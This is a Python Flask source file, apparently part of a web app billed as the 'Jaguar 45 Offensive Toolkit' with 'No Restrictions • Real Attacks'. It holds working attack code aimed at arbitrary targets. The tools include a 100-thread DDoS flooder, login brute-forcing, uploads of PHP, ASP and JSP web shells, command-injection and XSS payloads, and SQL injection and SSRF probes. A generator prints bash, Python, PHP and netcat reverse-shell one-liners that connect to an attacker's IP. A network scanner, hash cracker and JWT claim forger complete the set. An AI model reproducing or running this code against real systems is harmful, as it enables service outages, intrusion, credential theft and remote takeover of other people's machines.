                        results.append(f"VULNERABLE:     Error-based with '{payload}'")
                        break
                    
                    # Check time-based
                    if 'SLEEP' in payload.upper() and elapsed > 4:
                        vulnerable = True
                        results.append(f"VULNERABLE:     Time-based ({elapsed:.1f}s)")
                        break
                        
                except:
                    continue
            
            if vulnerable:
                results.append(f"Risk Level:     CRITICAL")
                results.append(f"Exploit:        Possible data extraction")
            else:
                results.append(f"Status:         Not vulnerable")
            
            return results
            
        except Exception as e:
            return [f"ERROR: {str(e)}"]
    
    def xss_scanner(self, target):
        """Real XSS testing with multiple vectors"""
        results = []
        
        try:
            if '?' not in target:
                target = f"{target}?test=1"
            
            results.append(f"Target:         {target}")
            results.append("="*50)
            
            payloads = [
                "<script>alert('XSS')</script>",
                "\"><script>alert('XSS')</script>",
                "'><script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')"
            ]
            
            vulnerable = False
            
            for payload in payloads:
                try:
                    test_url = target.replace("test=1", f"test={payload}")
                    response = requests.get(test_url, timeout=3, verify=False)
                    
                    if payload in response.text:
                        vulnerable = True
                        results.append(f"VULNERABLE:     Reflected XSS with {payload[:30]}...")
                        break
                        
                except:
                    continue
            
            if vulnerable:
                results.append(f"Risk Level:     HIGH")
                results.append(f"Impact:         Session hijacking, phishing")
            else:
                results.append(f"Status:         Not vulnerable")
            
            return results
            
        except Exception as e:
            return [f"ERROR: {str(e)}"]
    
    def ssrf_tester(self, target, test_url="http://localhost"):
        """Real SSRF testing"""
        results = []
        
        try:
            results.append(f"Target:         {target}")
            results.append(f"Test URL:       {test_url}")
            results.append("="*50)
            
            ssrf_params = ['url', 'file', 'path', 'load', 'src', 'image']
            
            vulnerable = False
            
            for param in ssrf_params:
                try:
                    if '?' in target:
                        test = f"{target}&{param}={test_url}"
                    else:
                        test = f"{target}?{param}={test_url}"
                    
                    response = requests.get(test, timeout=5, verify=False)
                    
                    if 'localhost' in response.text or '127.0.0.1' in response.text:
                        vulnerable = True
                        results.append(f"VULNERABLE:     SSRF via {param}")
                        results.append(f"Exploit:        Internal network access")
                        break
                        
                except:
                    continue
            
            if not vulnerable:
                results.append(f"Status:         Not vulnerable")
            
            return results
            
        except Exception as e:
            return [f"ERROR: {str(e)}"]
    
    # ========== ATTACK TOOLS ==========
    
    def ddos_flooder(self, target, duration="60"):
        """Real DDoS attack tool"""
        results = []
        
        try:
            if not target.startswith(('http://', 'https://')):
                target = 'http://' + target
            
            duration = int(duration) if duration.isdigit() else 60
            if duration > 300:  # Max 5 minutes
                duration = 300
            
            results.append(f"Target:         {target}")
            results.append(f"Duration:       {duration} seconds")
            results.append(f"Threads:        100")
            results.append("="*50)
            
            attack_id = str(uuid.uuid4())[:8]
            self.attack_threads[attack_id] = True
            
            requests_sent = 0
            errors = 0
            start_time = time.time()
            
            def attack_worker():
                nonlocal requests_sent, errors
                session = requests.Session()
                while time.time() - start_time < duration and self.attack_threads.get(attack_id):
                    try:
                        session.get(target, timeout=2, verify=False)
                        requests_sent += 1
                        time.sleep(0.01)
                    except:
                        errors += 1
            
            # Start multiple threads
            threads = []
            for i in range(100):
                t = threading.Thread(target=attack_worker)
                t.daemon = True
                t.start()
                threads.append(t)
            
            # Wait for attack to complete
            time.sleep(duration)
            
            # Clean up
            if attack_id in self.attack_threads:
                del self.attack_threads[attack_id]
            
            elapsed = time.time() - start_time
            
            results.append(f"Requests:       {requests_sent:,}")
            results.append(f"Errors:         {errors}")
            results.append(f"Req/Sec:        {requests_sent/elapsed:.1f}")
            results.append(f"Duration:       {elapsed:.1f}s")
            results.append("="*50)
            results.append(f"Attack Complete")
            
            return results
            
        except Exception as e:
            return [f"ERROR: {str(e)}"]
    
    def bruteforce_attack(self, target, wordlist="admin,password,123456"):
        """Real password brute force attack"""
        results = []
        
        try:
            if not target.startswith(('http://', 'https://')):
                target = 'http://' + target
            
            passwords = wordlist.split(',') if ',' in wordlist else [wordlist]
            
            results.append(f"Target:         {target}")
            results.append(f"Passwords:      {len(passwords)}")
            results.append("="*50)
            
            found = False
            
            for password in passwords:
                try:
                    # Try common form fields
                    data = {
                        'username': 'admin',
                        'password': password.strip(),
                        'email': 'admin',
                        'login': 'admin',
                        'user': 'admin'
                    }
                    
                    response = requests.post(target, data=data, timeout=3, verify=False)
                    
                    # Check for successful login indicators
                    if response.status_code in [200, 301, 302]:
                        if any(word in response.text.lower() for word in ['welcome', 'dashboard', 'logout', 'success']):
                            found = True
                            results.append(f"CRACKED:        Password: {password}")
                            results.append(f"Status Code:    {response.status_code}")
                            break
                    
                    time.sleep(0.1)  # Small delay
                    
                except:
                    continue
            
            if not found:
                results.append(f"Status:         No valid password found")
            
            return results
            
        except Exception as e:
            return [f"ERROR: {str(e)}"]
    
    def upload_exploit(self, target, file_type="php"):
        """File upload exploitation"""
        results = []
        
        try:
            if not target.startswith(('http://', 'https://')):
                target = 'http://' + target
            
            results.append(f"Target:         {target}")
            results.append(f"File Type:      {file_type}")
            results.append("="*50)
            
            # Create malicious file content
            if file_type.lower() == "php":
                content = b"<?php system($_GET['cmd']); ?>"
                filename = "shell.php"
            elif file_type.lower() == "asp":
                content = b"<% eval request('cmd') %>"
                filename = "shell.asp"
            else:
                content = b"<%= system(request('cmd')) %>"
                filename = "shell.jsp"
            
            files = {'file': (filename, content, 'application/octet-stream')}
            
            try:
                response = requests.post(target, files=files, timeout=5, verify=False)
                results.append(f"Status:         {response.status_code}")
                
                if response.status_code in [200, 201]:
                    results.append(f"Uploaded:       {filename}")
                    results.append(f"Shell URL:      {target.rstrip('/')}/uploads/{filename}")
                    results.append(f"Usage:          ?cmd=whoami")
                else:
                    results.append(f"Failed:         Upload rejected")
                    
            except Exception as e:
                results.append(f"Error:          {str(e)}")
            
            return results
            
        except Exception as e:
            return [f"ERROR: {str(e)}"]
    
    def wordpress_attack(self, target):
        """WordPress specific attacks"""
        results = []
        
        try:
            if not target.startswith(('http://', 'https://')):
                target = 'http://' + target
            
            results.append(f"Target:         {target}")
            results.append("="*50)
            
            # Check for WordPress
            wp_url = f"{target.rstrip('/')}/wp-admin/"
            try:
                response = requests.get(wp_url, timeout=3, verify=False)
                if 'wordpress' in response.text.lower():
                    results.append(f"WordPress:      DETECTED")
                    
                    # Try common vulnerabilities
                    vuln_urls = [
                        f"{target.rstrip('/')}/wp-content/debug.log",
                        f"{target.rstrip('/')}/wp-config.php",
                        f"{target.rstrip('/')}/wp-admin/admin-ajax.php",
                        f"{target.rstrip('/')}/xmlrpc.php"
                    ]
                    
                    for vuln_url in vuln_urls:
                        try:
                            resp = requests.head(vuln_url, timeout=2, verify=False)
                            if resp.status_code == 200:
                                results.append(f"VULNERABLE:     {vuln_url.split('/')[-1]}")
                        except:
                            pass
                else:
                    results.append(f"WordPress:      NOT DETECTED")
                    
            except:
                results.append(f"Error:          Could not access")
            
            return results
            
        except Exception as e:
            return [f"ERROR: {str(e)}"]
    
    # ========== EXPLOITATION TOOLS ==========
    
    def reverse_shell(self, ip, port="4444"):
        """Generate reverse shell payloads"""
        results = []
        
        try:
            results.append(f"Your IP:        {ip}")
            results.append(f"Port:           {port}")
            results.append("="*50)
            
            # Bash reverse shell
            bash_shell = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
            results.append(f"BASH:           {bash_shell}")
            
            # Python reverse shell
            python_shell = f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
            results.append(f"PYTHON:         {python_shell}")
            
            # PHP reverse shell
            php_shell = f"""php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'"""
            results.append(f"PHP:            {php_shell}")
            
            # Netcat reverse shell
            nc_shell = f"nc -e /bin/sh {ip} {port}"
            results.append(f"NETCAT:         {nc_shell}")
            
            results.append("="*50)
            results.append(f"Usage:          Start listener: nc -lvnp {port}")
            
            return results
            
        except Exception as e:
            return [f"ERROR: {str(e)}"]
    
    def rce_exploit(self, target, command="whoami"):
        """Command injection/RCE testing"""
        results = []
        
        try:
            results.append(f"Target:         {target}")
            results.append(f"Command:        {command}")
            results.append("="*50)
            
            # Try different injection methods
            injections = [
                f"'; {command} #",
                f"`{command}`",
                f"$({command})",
                f"|| {command}",
                f"&& {command}",
                f"| {command}",
                f"; {command}"
            ]
            
            vulnerable = False
            
            for injection in injections:
                try:
                    if '?' in target:
                        test_url = target + injection
                    else:
                        test_url = f"{target}?cmd={injection}"
                    
                    response = requests.get(test_url, timeout=3, verify=False)
                    
                    # Check for command output
                    if command in response.text or 'root' in response.text or 'www-data' in response.text:
                        vulnerable = True
                        results.append(f"VULNERABLE:     Command injection")
                        results.append(f"Injection:      {injection}")
                        break
                        
                except:
                    continue
            
            if vulnerable:
                results.append(f"Risk Level:     CRITICAL")
                results.append(f"Exploit:        Full system access")
            else:
                results.append(f"Status:         Not vulnerable")
            
            return results
            
        except Exception as e:
            return [f"ERROR: {str(e)}"]
    
    # ========== NETWORK ATTACKS ==========
    
    def network_scanner(self, network, ports="22,80,443"):
        """Network range scanning"""
        results = []
        
        try:
            results.append(f"Network:        {network}")
            results.append(f"Ports:          {ports}")
            results.append("="*50)
            
            port_list = [int(p) for p in ports.split(',')]
            live_hosts = []
            
            def scan_host(host):
                try:
                    for port in port_list:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        if sock.connect_ex((host, port)) == 0:
                            return host, True
                        sock.close()
                except:
                    pass
                return host, False
            
            # Generate IPs in network
            try:
                net = ipaddress.ip_network(network, strict=False)
                ips = [str(ip) for ip in net.hosts()][:254]  # Limit to 254 hosts
                
                with ThreadPoolExecutor(max_workers=100) as executor:
                    futures = {executor.submit(scan_host, ip): ip for ip in ips}
                    for future in as_completed(futures):
                        host, is_live = future.result()
                        if is_live:
                            live_hosts.append(host)
                            results.append(f"LIVE:           {host}")
                            
            except:
                results.append(f"Error:          Invalid network format")
            
            results.append("="*50)
            results.append(f"Live Hosts:     {len(live_hosts)}")
            
            return results
            
        except Exception as e:
            return [f"ERROR: {str(e)}"]
    
    # ========== CRYPTO ATTACKS ==========
    
    def hash_cracker(self, hash_value, hash_type="md5"):
        """Advanced hash cracking"""
        results = []
        
        try:
            results.append(f"Hash:           {hash_value}")
            results.append(f"Type:           {hash_type}")
            results.append("="*50)
            
            # Common passwords to try
            common_passwords = [
                "password", "123456", "12345678", "qwerty", "abc123",
                "password1", "admin", "letmein", "welcome", "monkey",
                "dragon", "baseball", "football", "hello", "secret"
            ]
            
            found = False
            
            for password in common_passwords:
                hashed = None
                
                if hash_type.lower() == "md5":
                    hashed = hashlib.md5(password.encode()).hexdigest()
                elif hash_type.lower() == "sha1":
                    hashed = hashlib.sha1(password.encode()).hexdigest()
                elif hash_type.lower() == "sha256":
                    hashed = hashlib.sha256(password.encode()).hexdigest()
                
                if hashed and hashed.lower() == hash_value.lower():
                    found = True
                    results.append(f"CRACKED:        {password}")
                    break
            
            if not found:
                results.append(f"Status:         Not in common list")
                results.append(f"Suggest:        Try larger wordlist")
            
            return results
            
        except Exception as e:
            return [f"ERROR: {str(e)}"]
    
    def jwt_forger(self, token, new_claim="admin=true"):
        """JWT token manipulation"""
        results = []
        
        try:
            results.append(f"Token:          {token[:50]}...")
            results.append(f"New Claim:      {new_claim}")
            results.append("="*50)
            
            parts = token.split('.')
            
            if len(parts) != 3:
                results.append(f"Error:          Invalid JWT format")
                return results
            
            results.append(f"Format:         Valid JWT")
            
            # Decode payload
            try:
                import base64
                payload = json.loads(base64.urlsafe_b64decode(parts[1] + '==').decode())
                results.append(f"Original:       {json.dumps(payload)[:50]}...")
                
                # Add/modify claim
                key, value = new_claim.split('=') if '=' in new_claim else (new_claim, "true")
                payload[key.strip()] = value.strip()
                
                results.append(f"Modified:       {json.dumps(payload)[:50]}...")
                results.append(f"Note:           Re-sign with correct secret")
                
            except:
                results.append(f"Error:          Could not decode payload")
            
            return results
            
        except Exception as e:
            return [f"ERROR: {str(e)}"]
    
    def get_service(self, port):
        services = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
            80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB",
            993: "IMAPS", 995: "POP3S", 3306: "MySQL", 3389: "RDP",
            5432: "PostgreSQL", 5900: "VNC", 8080: "HTTP-Proxy", 8443: "HTTPS-Alt"
        }
        return services.get(port, "Unknown")
    
    def stop_all_attacks(self):
        """Stop all running attacks"""
        self.attack_threads.clear()
        return "All attacks stopped"

# ========== TOOL INSTANCE ==========
tools = OffensiveTools()

# ========== FLASK ROUTES ==========
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/attack', methods=['POST'])
def attack():
    try:
        data = request.get_json()
        tool_id = int(data.get('tool', 1))
        target = data.get('target', '').strip()
        extra = data.get('extra', '').strip()
        
        if not target:
            return jsonify({'error': 'Target required'})
        
        results = []
        
        # Map tool IDs to methods
        tool_map = {
            # Reconnaissance (1-10)
            1: tools.port_scan,
            2: tools.subdomain_scan,
            3: tools.directory_scan,
            4: lambda t, e: ["DNS Records - Coming soon"],
            5: lambda t, e: ["WHOIS Lookup - Coming soon"],
            6: lambda t, e: ["SSL Checker - Coming soon"],
            7: lambda t, e: ["IP Geolocation - Coming soon"],
            8: lambda t, e: ["Website Info - Coming soon"],
            9: lambda t, e: ["CMS Detector - Coming soon"],
            10: lambda t, e: ["Headers Analyzer - Coming soon"],
            
            # Vulnerability (11-20)
            11: tools.sql_injection,
            12: tools.xss_scanner,
            13: tools.ssrf_tester,
            14: lambda t, e: ["LFI/RFI Tester - Coming soon"],
            15: lambda t, e: ["Command Injection - Coming soon"],
            16: lambda t, e: ["XXE Tester - Coming soon"],
            17: lambda t, e: ["CSRF Tester - Coming soon"],
            18: lambda t, e: ["IDOR Scanner - Coming soon"],
            19: lambda t, e: ["Open Redirect - Coming soon"],
            20: lambda t, e: ["CORS Misconfig - Coming soon"],
            
            # Attack Tools (21-30)
            21: tools.ddos_flooder,
            22: tools.bruteforce_attack,
            23: lambda t, e: ["Password Spray - Coming soon"],
            24: lambda t, e: ["Session Hijack - Coming soon"],
            25: lambda t, e: ["JWT Attack - Coming soon"],
            26: lambda t, e: ["API Fuzzer - Coming soon"],
            27: tools.upload_exploit,
            28: tools.wordpress_attack,
            29: lambda t, e: ["Admin Panel Finder - Coming soon"],
            30: lambda t, e: ["Backup Finder - Coming soon"],
            
            # Exploitation (31-40)
            31: tools.reverse_shell,
            32: lambda t, e: ["Web Shell - Coming soon"],
            33: lambda t, e: ["File Inclusion - Coming soon"],
            34: tools.rce_exploit,
            35: lambda t, e: ["SSTI Tester - Coming soon"],
            36: lambda t, e: ["Deserialization - Coming soon"],
            37: lambda t, e: ["Buffer Overflow - Coming soon"],
            38: lambda t, e: ["Privilege Escalation - Coming soon"],
            39: lambda t, e: ["Metasploit Helper - Coming soon"],
            40: lambda t, e: ["Payload Generator - Coming soon"],
            
            # Network (41-50)
            41: tools.network_scanner,
            42: lambda t, e: ["ARP Spoofing - Coming soon"],
            43: lambda t, e: ["MAC Flood - Coming soon"],
            44: lambda t, e: ["DNS Spoofing - Coming soon"],
            45: lambda t, e: ["Port Knocking - Coming soon"],
            46: lambda t, e: ["Firewall Bypass - Coming soon"],
            47: lambda t, e: ["VPN Detection - Coming soon"],
            48: lambda t, e: ["Packet Sniffer - Coming soon"],
            49: lambda t, e: ["Traceroute - Coming soon"],
            50: lambda t, e: ["Ping Flood - Coming soon"],
            
            # Crypto (51-60)
            51: tools.hash_cracker,
            52: lambda t, e: ["Password Cracker - Coming soon"],
            53: lambda t, e: ["SSL Stripping - Coming soon"],
            54: lambda t, e: ["Certificate Attack - Coming soon"],
            55: lambda t, e: ["Encryption/Decryption - Coming soon"],
            56: lambda t, e: ["Steganography - Coming soon"],
            57: lambda t, e: ["RSA Attack - Coming soon"],
            58: lambda t, e: ["XOR Cracker - Coming soon"],
            59: lambda t, e: ["Base64 Attack - Coming soon"],
            60: tools.jwt_forger
        }
        
        if tool_id in tool_map:
            results = tool_map[tool_id](target, extra if extra else "")
        else:
            return jsonify({'error': 'Invalid tool ID'})
        
        return jsonify({'success': True, 'results': results})
    
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/stop', methods=['POST'])
def stop():
    tools.stop_all_attacks()
    return jsonify({'success': True, 'message': 'All attacks stopped'})

@app.route('/health')
def health():
    return jsonify({
        'status': 'healthy',
        'service': 'Jaguar 45 Offensive Toolkit',
        'version': '4.0',
        'tools': 60,
        'timestamp': datetime.now().isoformat()
    })

# ========== APPLICATION ENTRY POINT ==========
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    
    print(f"""
    ╔══════════════════════════════════════════════════════════╗
    ║         JAGUAR 45 - OFFENSIVE ATTACK TOOLKIT             ║
    ║           No Restrictions • Real Attacks                 ║
    ║                                                          ║
    ║         Server: http://localhost:{port:<15}               ║
    ║         Tools: 60 • Attack Mode: ENABLED                ║
    ╚══════════════════════════════════════════════════════════╝
    """)
    
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
